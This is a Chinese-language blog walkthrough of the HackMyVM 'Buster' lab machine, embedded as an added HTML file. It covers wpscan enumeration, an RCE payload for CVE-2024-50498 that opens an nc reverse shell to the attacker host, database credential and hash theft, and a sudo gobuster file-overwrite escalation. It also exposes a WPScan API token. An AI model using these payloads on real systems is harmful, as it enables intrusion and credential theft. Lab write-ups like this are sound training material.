@@ -1,0 +1,644 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jednersaous">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Lookthrough for HackMyVM_Buster">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lookthrough for HackMyVM_Buster">
+<meta property="og:url" content="http://example.com/2025/02/18/HackMyVM_Buster/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Lookthrough for HackMyVM_Buster">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/penetration.png">
+<meta property="article:published_time" content="2025-02-18T02:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-01T07:16:57.912Z">
+<meta property="article:author" content="Jednersaous">
+<meta property="article:tag" content="Penetration">
+<meta property="article:tag" content="lookthrough">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/penetration.png">
+  
+  
+  
+  <title>Lookthrough for HackMyVM_Buster - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Hello, it&#39;s jednersaous</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lookthrough for HackMyVM_Buster"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-18 10:00" pubdate>
+          2025年2月18日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          963 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lookthrough for HackMyVM_Buster</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="HackMyVM-Buster"><a href="#HackMyVM-Buster" class="headerlink" title="HackMyVM_Buster"></a>HackMyVM_Buster</h1><p>这台机子的网卡又有问题<br>配好后，nmap扫一下</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[/usr/share/wordlists/metasploit]<br>└─<span class="hljs-comment"># nmap 192.168.64.6</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.64</span><span class="hljs-number">.6</span><br>Host is up (<span class="hljs-number">0.00068</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br>MAC Address: CE:<span class="hljs-number">5</span>E:DA:EA:E4:<span class="hljs-number">33</span> (Unknown)<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">13.27</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>上80看了下 是wordpress<br>wpscan扫一下 这里学到了 用免费的wpscan官网的api-token可以扫一下数据库</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>wordlists<span class="hljs-operator">/</span>metasploit]<br>└─<span class="hljs-comment"># wpscan --url http://192.168.64.6/ -e vp,u --api-token wfO2qNYqlam4QGql4RFJXIXG0oohePz5k7kSpRbXxfI</span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  __ \ <span class="hljs-symbol">/</span> ____|<br>          \ \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>| |__) | (___   ___  __ _ _ __ ®<br>           \ \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> |  ___<span class="hljs-symbol">/</span> \___ \ <span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> _` | &#x27;_ \<br>            \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span>  | |     ____) | (__| (_| | | | |<br>             \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span>   |_|    |_____<span class="hljs-symbol">/</span> \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">27</span><br>       Sponsored by Automattic <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>automattic.com<span class="hljs-symbol">/</span><br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-symbol">/</span> [<span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span>]<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Started:</span> Tue Feb <span class="hljs-number">18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span>:<span class="hljs-number">10</span> <span class="hljs-number">2025</span><br><br>Interesting Finding(s):<br><br>[<span class="hljs-operator">+</span>] Headers<br> | Interesting <span class="hljs-params">Entry:</span> <span class="hljs-params">Server:</span> nginx<span class="hljs-symbol">/1.14.2</span><br> | Found <span class="hljs-params">By:</span> Headers (Passive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] robots.txt <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//192.168.64.6/robots.txt</span><br> | Interesting <span class="hljs-params">Entries:</span><br> |  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-admin<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin/admin-ajax.php</span><br> | Found <span class="hljs-params">By:</span> Robots Txt (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] XML-RPC seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//192.168.64.6/xmlrpc.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_ghost_scanner<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>dos<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_dos<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_login<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_pingback_access<span class="hljs-symbol">/</span><br><br>[<span class="hljs-operator">+</span>] WordPress readme <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//192.168.64.6/readme.html</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] The external WP-Cron seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//192.168.64.6/wp-cron.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">60</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[<span class="hljs-operator">+</span>] WordPress version <span class="hljs-number">6.7</span>.<span class="hljs-number">1</span> identified (Outdated, released on <span class="hljs-number">202</span>4-<span class="hljs-number">1</span>1-<span class="hljs-number">21</span>).<br> | Found <span class="hljs-params">By:</span> Meta Generator (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>, <span class="hljs-params">Match:</span> &#x27;WordPress <span class="hljs-number">6.7</span>.<span class="hljs-number">1</span>&#x27;<br> | Confirmed <span class="hljs-params">By:</span> Rss Generator (Aggressive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.7</span>.<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>comments<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.7</span>.<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br><br>[i] The main theme could not be detected.<br><br>[<span class="hljs-operator">+</span>] Enumerating Vulnerable Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[<span class="hljs-operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs <span class="hljs-operator">-</span> <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-operator">&lt;=</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> (<span class="hljs-number">10</span> <span class="hljs-symbol">/</span> <span class="hljs-number">10</span>) <span class="hljs-number">100.00</span>% <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><br>[i] User(s) <span class="hljs-params">Identified:</span><br><br>[<span class="hljs-operator">+</span>] ta0<br> | Found <span class="hljs-params">By:</span> Wp Json Api (Aggressive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>wp-json<span class="hljs-operator">/</span>wp<span class="hljs-operator">/</span>v2<span class="hljs-operator">/</span>users<span class="hljs-operator">/</span><span class="hljs-operator">?</span>per_page<span class="hljs-operator">=</span><span class="hljs-number">100</span>&amp;page<span class="hljs-operator">=</span><span class="hljs-number">1</span><br> | Confirmed <span class="hljs-params">By:</span><br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing <span class="hljs-operator">-</span> Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[<span class="hljs-operator">+</span>] welcome<br> | Found <span class="hljs-params">By:</span> Author Id Brute Forcing <span class="hljs-operator">-</span> Author Pattern (Aggressive Detection)<br> | Confirmed <span class="hljs-params">By:</span> Login Error Messages (Aggressive Detection)<br><br>[<span class="hljs-operator">+</span>] WPScan DB API OK<br> | <span class="hljs-params">Plan:</span> free<br> | Requests Done (during the scan): <span class="hljs-number">1</span><br> | Requests <span class="hljs-params">Remaining:</span> <span class="hljs-number">24</span><br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Finished:</span> Tue Feb <span class="hljs-number">18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span> <span class="hljs-number">2025</span><br>[<span class="hljs-operator">+</span>] Requests <span class="hljs-params">Done:</span> <span class="hljs-number">17</span><br>[<span class="hljs-operator">+</span>] Cached <span class="hljs-params">Requests:</span> <span class="hljs-number">42</span><br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Sent:</span> <span class="hljs-number">4.404</span> KB<br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Received:</span> <span class="hljs-number">56.764</span> KB<br>[<span class="hljs-operator">+</span>] Memory <span class="hljs-params">used:</span> <span class="hljs-number">216.934</span> MB<br>[<span class="hljs-operator">+</span>] Elapsed <span class="hljs-params">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span><br></code></pre></td></tr></table></figure>
+<p>有用户凭据ta0和welcome 但是爆破好像都不太行<br>又学到了 wpscan扫插件得更细一点<br><code>wpscan --url http://192.168.64.6/ -e ap --plugins-detection --api-token wfO2qNYqlam4QGql4RFJXIXG0oohePz5k7kSpRbXxfI</code><br>扫的疑似有点慢了 下次真得把kali内存和处理器数调上去了</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">[!] <span class="hljs-number">1</span> vulnerability identified:<br> |<br> | [!] Title: WP Query Console &lt;= <span class="hljs-number">1.0</span> - Unauthenticated Remote Code Execution<br> |     References:<br> |      - https://wpscan.com/vulnerability/f911568d-5f79-<span class="hljs-number">49b7</span>-8ce4-fa0da3183214<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">50498</span><br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3<br> |<br></code></pre></td></tr></table></figure>
+<p>结果是有wp query的洞<br><a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/CVE-2024-50498">见这里利用（github）</a></p>
+<p>可以执行任意php命令 就是ban了一些系统函数 但是没完全ban<br><code>&#123;&quot;queryArgs&quot;:&quot;shell_exec(&#39;nc -e /bin/bash 192.168.64.2 1234&#39;);&quot;,&quot;queryType&quot;:&quot;post&quot;&#125;</code><br>直接把shell弹回来 顺便升级一下shell</p>
+<p>读wp-config.php 拿到mysql凭据<code>ll104567:thehandsomeguy</code><br><code>mysql -u ll104567 -p</code>登上去</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use wordpress;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> wp_users;<br></code></pre></td></tr></table></figure>
+<p>拿到ta0和welcome的密码hash 用john跑rockyou<br><code>ta0:$P$BDDc71nM67DbOVN/U50WFGII6EF6.r.</code><br><code>welcome:$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/</code></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(root㉿kali)-[/tmp]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash<br>Created directory: /root/.john<br><span class="hljs-keyword">Using</span> default input encoding: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> password hash (phpass [phpass (<span class="hljs-symbol">$</span>P<span class="hljs-symbol">$</span> <span class="hljs-keyword">or</span> <span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>) <span class="hljs-number">128</span>/<span class="hljs-number">128</span> ASIMD <span class="hljs-number">4</span>x2])<br>Cost <span class="hljs-number">1</span> (iteration count) is <span class="hljs-number">8192</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C to <span class="hljs-keyword">abort</span>, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">104567</span>           (?)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">36</span> DONE (<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-18</span> <span class="hljs-number">02</span>:<span class="hljs-number">21</span>) <span class="hljs-number">0.02724</span>g/s <span class="hljs-number">20200</span>p/s <span class="hljs-number">20200</span>c/s <span class="hljs-number">20200</span>C/s <span class="hljs-number">112233669.</span><span class="hljs-number">.085356</span><br>Use the <span class="hljs-string">&quot;--show --format=phpass&quot;</span> <span class="hljs-keyword">options</span> to <span class="hljs-keyword">display</span> <span class="hljs-keyword">all</span> of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+<p>跑出welcome的密码是104567 ta0的跑不出来<br>ssh登上welcome就能拿到user flag</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">welcome<span class="hljs-variable">@listen</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> welcome on <span class="hljs-symbol">listen:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> welcome may run the following commands on <span class="hljs-symbol">listen:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/gobuster<br></code></pre></td></tr></table></figure>
+<p>sudo -l发现可以运行gobuster<br>这里又学到了（<br>先拉个pspy64下来看看定时任务<br><code>2025/02/18 02:50:01 CMD: UID=0     PID=1304   | /bin/sh -c /bin/bash /opt/.test.sh</code><br>有一个&#x2F;opt&#x2F;.test.sh 联想到gobuster -o可以写入文件 所以把这个.test.sh覆写了就行</p>
+<p>覆写流程<br>首先攻击机必须得有对应的路径 比如我在~下启动python服务器 那么想要有输出（比如说&#x2F;tmp&#x2F;b）写入&#x2F;opt&#x2F;.test.sh 则必须<code>mkdir tmp;cd /tmp;touch b</code> 即有这个路径能给gobuster访问 同时<code>echo &#39;tmp/b&#39; &gt; a.txt</code>这是宿主机的操作 因为gobuster会在最前面补上一个&#x2F;<br><code>sudo gobuster -w a.txt -u http://192.168.64.2:8000/ -n -q -o /opt/.test.sh</code><br>ls看到&#x2F;opt&#x2F;.test.sh的大小确实发生了变化</p>
+<p>但是不知道什么情况 覆写了之后shell就是弹不回来？？？</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Penetration/" class="print-no-link">#Penetration</a>
+      
